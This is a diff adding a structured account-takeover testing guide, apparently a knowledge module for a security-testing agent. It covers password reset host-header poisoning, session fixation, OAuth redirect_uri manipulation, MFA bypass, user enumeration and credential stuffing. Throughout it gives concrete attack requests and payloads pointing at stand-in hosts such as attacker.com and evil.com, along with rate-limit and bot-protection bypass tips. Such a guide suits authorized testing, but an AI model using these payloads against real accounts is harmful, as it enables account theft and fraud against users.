@@ -1,0 +1,511 @@
+<account_takeover_guide>
+<title>ACCOUNT TAKEOVER (ATO) TESTING</title>
+
+<critical>Account takeover vulnerabilities allow attackers to gain unauthorized access to user accounts through various authentication and session management weaknesses. Testing must cover password reset flows, session handling, OAuth implementations, MFA bypass techniques, and user enumeration vectors.</critical>
+
+<scope>
+- Password reset poisoning
+- Session fixation and hijacking
+- Credential stuffing patterns
+- OAuth account linking vulnerabilities
+- Email/phone number enumeration
+- MFA bypass techniques
+- Account recovery exploitation
+- Social engineering vectors
+</scope>
+
+<methodology>
+1. Map all authentication and account recovery endpoints.
+2. Test password reset flows for token predictability and poisoning.
+3. Analyze session management for fixation and hijacking vulnerabilities.
+4. Probe OAuth implementations for account linking flaws.
+5. Test MFA bypass techniques and backup code security.
+6. Identify user enumeration vectors across all endpoints.
+</methodology>
+
+<password_reset_poisoning>
+<host_header_injection>
+{% raw %}
+# Host header manipulation in password reset:
+
+# Basic host header injection:
+POST /forgot-password HTTP/1.1
+Host: attacker.com
+Content-Type: application/json
+
+{"email": "victim@target.com"}
+
+# X-Forwarded-Host injection:
+POST /forgot-password HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com
+
+{"email": "victim@target.com"}
+
+# Multiple host headers:
+POST /forgot-password HTTP/1.1
+Host: target.com
+Host: attacker.com
+
+{"email": "victim@target.com"}
+
+# Absolute URL override:
+POST /forgot-password HTTP/1.1
+Host: target.com
+X-Forwarded-Proto: https
+X-Forwarded-Host: attacker.com
+
+{"email": "victim@target.com"}
+{% endraw %}
+</host_header_injection>
+
+<token_analysis>
+{% raw %}
+# Token predictability testing:
+
+# Request multiple reset tokens:
+# Analyze for patterns:
+# - Sequential tokens
+# - Timestamp-based tokens
+# - Weak entropy
+# - User ID encoded in token
+# - Predictable hash algorithms
+
+# Token format examples to test:
+base64(user_id + timestamp)
+md5(email + static_secret)
+sequential_id + random_suffix
+uuid4()  # Check if truly random
+
+# Token reuse testing:
+# - Use same token multiple times
+# - Check token expiration
+# - Test token after password change
+# - Race condition: use token while changing password
+{% endraw %}
+</token_analysis>
+
+<reset_flow_bypass>
+{% raw %}
+# Password reset bypass techniques:
+
+# 1. Parameter manipulation:
+POST /reset-password HTTP/1.1
+{"token": "valid_token", "email": "attacker@evil.com", "password": "newpass"}
+
+# 2. Token in response:
+# Check if reset token appears in:
+# - Response body
+# - Response headers
+# - Error messages
+# - JavaScript files
+
+# 3. Email parameter pollution:
+{"email": ["victim@target.com", "attacker@evil.com"]}
+{"email": "victim@target.com,attacker@evil.com"}
+{"email": "victim@target.com%00attacker@evil.com"}
+
+# 4. Case sensitivity bypass:
+{"email": "VICTIM@TARGET.COM"}
+{"email": "victim@TARGET.com"}
+{% endraw %}
+</reset_flow_bypass>
+</password_reset_poisoning>
+
+<session_attacks>
+<session_fixation>
+{% raw %}
+# Session fixation testing:
+
+# 1. Pre-login session:
+# - Note session ID before login
+# - Login with valid credentials
+# - Check if session ID changed
+
+# 2. URL-based session:
+https://target.com/login?JSESSIONID=attacker_session
+https://target.com/login;jsessionid=attacker_session
+
+# 3. Cookie injection via subdomain:
+# Set cookie from *.target.com
+Set-Cookie: session=attacker_session; Domain=.target.com
+
+# 4. Meta tag injection (if XSS exists):
+<meta http-equiv="Set-Cookie" content="session=attacker_session">
+
+# Validation:
+# - Login with attacker session
+# - Verify session is still valid
+# - Check for session regeneration on privilege change
+{% endraw %}
+</session_fixation>
+
+<session_hijacking>
+{% raw %}
+# Session token analysis:
+
+# Cookie security attributes:
+# - Check HttpOnly flag
+# - Check Secure flag
+# - Check SameSite attribute
+# - Check Domain scope
+# - Check Path restrictions
+
+# Session exposure vectors:
+# - Referrer header leakage
+# - Log file exposure
+# - URL parameters
+# - XSS vulnerabilities
+# - CORS misconfigurations
+
+# Concurrent session testing:
+# - Multiple active sessions allowed?
+# - Session invalidation on password change?
+# - Session invalidation on logout?
+# - Session timeout enforcement?
+
+# Session token strength:
+# - Entropy analysis (>128 bits recommended)
+# - Pattern detection
+# - Timestamp correlation
+{% endraw %}
+</session_hijacking>
+</session_attacks>
+
+<oauth_vulnerabilities>
+<account_linking>
+{% raw %}
+# OAuth account linking attacks:
+
+# 1. State parameter bypass:
+# - Missing state parameter
+# - Predictable state values
+# - State reuse across sessions
+
+# 2. Redirect URI manipulation:
+?redirect_uri=https://evil.com/callback
+?redirect_uri=https://target.com.evil.com/callback
+?redirect_uri=https://target.com@evil.com/callback
+?redirect_uri=https://target.com%2F%2Fevil.com/callback
+
+# 3. Authorization code theft:
+# - Code in referrer header
+# - Code logged in access logs
+# - Open redirect + code theft
+
+# 4. Account linking race condition:
+# - Link OAuth account while user is changing email
+# - Link during password reset flow
+{% endraw %}
+</account_linking>
+
+<token_abuse>
+{% raw %}
+# OAuth token vulnerabilities:
+
+# 1. Token scope escalation:
+# Request more scopes than authorized
+scope=email profile admin
+
+# 2. Token leakage:
+# - Access token in URL fragment
+# - Refresh token exposed
+# - Token in browser history
+
+# 3. Provider impersonation:
+# - Accept tokens from any provider
+# - Missing audience validation
+# - Missing issuer validation
+
+# 4. Client confusion:
+# - Exchange tokens between clients
+# - Token reuse across applications
+{% endraw %}
+</token_abuse>
+
+<oauth_misconfigurations>
+{% raw %}
+# Common OAuth misconfigurations:
+
+# 1. Implicit flow vulnerabilities:
+# - Token in URL fragment
+# - No PKCE protection
+# - Missing nonce validation
+
+# 2. Authorization server issues:
+# - Weak redirect_uri validation
+# - Missing CSRF protection
+# - Token/code substitution
+
+# 3. Client-side vulnerabilities:
+# - Insecure storage of tokens
+# - Missing token validation
+# - CORS allowing credential theft
+{% endraw %}
+</oauth_misconfigurations>
+</oauth_vulnerabilities>
+
+<user_enumeration>
+<enumeration_vectors>
+{% raw %}
+# User enumeration techniques:
+
+# 1. Login endpoint:
+# Different responses for:
+# - "Invalid username"
+# - "Invalid password"
+# - Response time differences
+
+# 2. Registration endpoint:
+# - "Email already registered"
+# - "Username taken"
+
+# 3. Password reset:
+# - "Email sent" vs "User not found"
+# - Response time differences
+
+# 4. Profile endpoints:
+/api/user/victim@email.com
+/api/profile/username
+/user/12345
+
+# 5. API enumeration:
+POST /api/check-email
+{"email": "test@example.com"}
+
+# 6. Timing attacks:
+# Measure response times for existing vs non-existing users
+{% endraw %}
+</enumeration_vectors>
+
+<enumeration_bypass>
+{% raw %}
+# Enumeration protection bypass:
+
+# 1. Case variation:
+user@example.com
+USER@EXAMPLE.COM
+User@Example.Com
+
+# 2. Email normalization bypass:
+user+tag@example.com
+user.name@example.com (vs username@example.com)
+
+# 3. Subdomain email:
+user@mail.example.com
+user@example.com
+
+# 4. Response fingerprinting:
+# - Content-Length differences
+# - Response header differences
+# - Subtle timing differences
+# - Error message variations
+{% endraw %}
+</enumeration_bypass>
+</user_enumeration>
+
+<mfa_bypass>
+<bypass_techniques>
+{% raw %}
+# MFA bypass methods:
+
+# 1. Direct endpoint access:
+# Skip MFA step and access protected endpoints directly
+GET /dashboard
+Authorization: Bearer <pre-mfa-token>
+
+# 2. Response manipulation:
+# Change MFA verification response from false to true
+{"mfa_verified": true}
+
+# 3. Backup code bruteforce:
+# - 8-digit backup codes: 100M possibilities
+# - Check for rate limiting
+# - Check for lockout after failures
+
+# 4. SIM swap preparation:
+# - Phone number enumeration
+# - Carrier information disclosure
+
+# 5. Recovery flow bypass:
+# - "Lost device" flow bypasses MFA
+# - Support ticket social engineering
+
+# 6. Session token manipulation:
+# - Modify session to appear MFA-verified
+# - JWT claim manipulation
+{% endraw %}
+</bypass_techniques>
+
+<totp_vulnerabilities>
+{% raw %}
+# TOTP/authenticator vulnerabilities:
+
+# 1. Secret key exposure:
+# - QR code in response body
+# - Secret in URL parameters
+# - Secret logged in server logs
+
+# 2. Time window exploitation:
+# - Generous time windows
+# - No rate limiting on TOTP
+# - TOTP code reuse allowed
+
+# 3. Backup code issues:
+# - Codes visible after setup
+# - Weak backup code generation
+# - No revocation mechanism
+
+# 4. TOTP brute force:
+# 6-digit code = 1M possibilities
+# 30-second window = ~3 attempts per window
+# Without rate limiting: 20 hours to exhaust
+{% endraw %}
+</totp_vulnerabilities>
+
+<sms_vulnerabilities>
+{% raw %}
+# SMS MFA vulnerabilities:
+
+# 1. SIM swap attacks:
+# - Social engineering carrier
+# - Port-out fraud
+
+# 2. SS7 interception:
+# - Protocol-level SMS interception
+
+# 3. SMS delivery issues:
+# - Codes in URL parameters
+# - Codes in push notifications (visible on lock screen)
+
+# 4. Phone number manipulation:
+# - International format bypass
+# - VoIP number acceptance
+# - Temporary number services
+{% endraw %}
+</sms_vulnerabilities>
+</mfa_bypass>
+
+<credential_stuffing>
+<attack_patterns>
+{% raw %}
+# Credential stuffing detection and testing:
+
+# 1. Rate limiting bypass:
+# - Distributed IPs
+# - Header rotation (X-Forwarded-For)
+# - User-Agent rotation
+# - Slow and low attacks
+
+# 2. CAPTCHA bypass:
+# - Solving services
+# - Cookie replay
+# - API endpoint without CAPTCHA
+
+# 3. Common vectors:
+# - Login endpoint
+# - Mobile API
+# - Legacy endpoints
+# - Admin panels
+
+# 4. Credential format testing:
+# - Email:password
+# - Username:password
+# - Phone:password
+{% endraw %}
+</attack_patterns>
+
+<defense_bypass>
+{% raw %}
+# Defense bypass techniques:
+
+# 1. Account lockout bypass:
+# - Lockout per username vs per IP
+# - Lockout timer manipulation
+# - Different lockout for different endpoints
+
+# 2. Rate limit bypass:
+X-Forwarded-For: 1.2.3.{1-255}
+X-Real-IP: rotating
+X-Originating-IP: rotating
+True-Client-IP: rotating
+
+# 3. Behavioral detection bypass:
+# - Mimic real user behavior
+# - Random delays between requests
+# - Normal HTTP headers
+# - Cookie handling
+
+# 4. Bot protection bypass:
+# - Headless browser detection bypass
+# - JavaScript challenge solving
+# - Fingerprint randomization
+{% endraw %}
+</defense_bypass>
+</credential_stuffing>
+
+<common_payloads>
+{% raw %}
+# Password reset poisoning:
+X-Forwarded-Host: attacker.com
+X-Forwarded-Proto: https
+X-Original-URL: /reset?token=xxx
+
+# Session fixation:
+Cookie: session=attacker_controlled_value
+?JSESSIONID=attacker_session
+
+# OAuth manipulation:
+redirect_uri=https://evil.com
+state=predictable_value
+
+# MFA bypass:
+POST /api/verify-mfa {"skip": true}
+POST /dashboard (skip MFA step)
+
+# Enumeration:
+POST /forgot-password {"email": "test@test.com"}
+GET /api/users/check?email=test@test.com
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate password reset token theft via host header injection.
+2. Show session fixation with persistent access after victim login.
+3. Prove OAuth account linking vulnerability with attacker-controlled provider.
+4. Document MFA bypass with step-skip or response manipulation.
+5. Provide timing-based user enumeration proof.
+</validation>
+
+<false_positives>
+- Intentionally generic error messages across all auth endpoints
+- Rate limiting that blocks before enumeration is possible
+- MFA that cannot be bypassed or skipped
+- OAuth with strict redirect_uri validation
+- Session regeneration on every privilege change
+</false_positives>
+
+<impact>
+- Complete account takeover
+- Unauthorized access to sensitive data
+- Financial fraud and theft
+- Identity theft
+- Lateral movement to other accounts
+- Compliance violations (GDPR, PCI-DSS)
+</impact>
+
+<pro_tips>
+1. Always test password reset with host header variations.
+2. Check if session IDs change after authentication state changes.
+3. Test OAuth flows with state parameter manipulation.
+4. Analyze MFA implementation for skip and bypass options.
+5. Use timing analysis for subtle enumeration vulnerabilities.
+6. Test credential stuffing protections with distributed requests.
+7. Check backup code security and generation patterns.
+8. Verify account lockout applies consistently across endpoints.
+9. Test mobile and legacy API endpoints for weaker security.
+10. Document exact steps for reproducible account takeover chains.
+</pro_tips>
+
+<remember>Account takeover often chains multiple smaller vulnerabilities. A weak password reset combined with user enumeration can lead to full account compromise. Always test the complete authentication lifecycle and look for gaps between security controls.</remember>
+</account_takeover_guide>
